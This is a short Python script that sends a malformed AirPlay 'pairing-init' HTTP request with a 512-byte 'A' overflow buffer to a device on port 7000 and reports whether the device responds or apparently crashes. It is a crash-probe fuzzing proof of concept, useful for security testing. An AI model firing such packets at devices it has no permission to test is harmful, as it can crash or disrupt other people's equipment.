import socket
import time

target_ip = "192.168.1.42"  # <-- CHANGE to your test device IP
target_port = 7000

# Fuzzing AirPlay Pairing: malformed init payload
payload = b"POST /pairing-init HTTP/1.1\r\n"
payload += b"Content-Length: 512\r\n"
payload += b"Content-Type: application/octet-stream\r\n"
payload += b"\r\n"
payload += b"A" * 512  # Overflow with large buffer

print(f"[*] Connecting to {target_ip}:{target_port}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((target_ip, target_port))

print("[*] Sending malicious pairing-init packet...")
s.send(payload)

try:
    response = s.recv(1024)
    print("[*] Response:")
    print(response.decode(errors="ignore"))
except socket.timeout:
    print("[!] No response â€“ possible crash or timeout")
s.close()
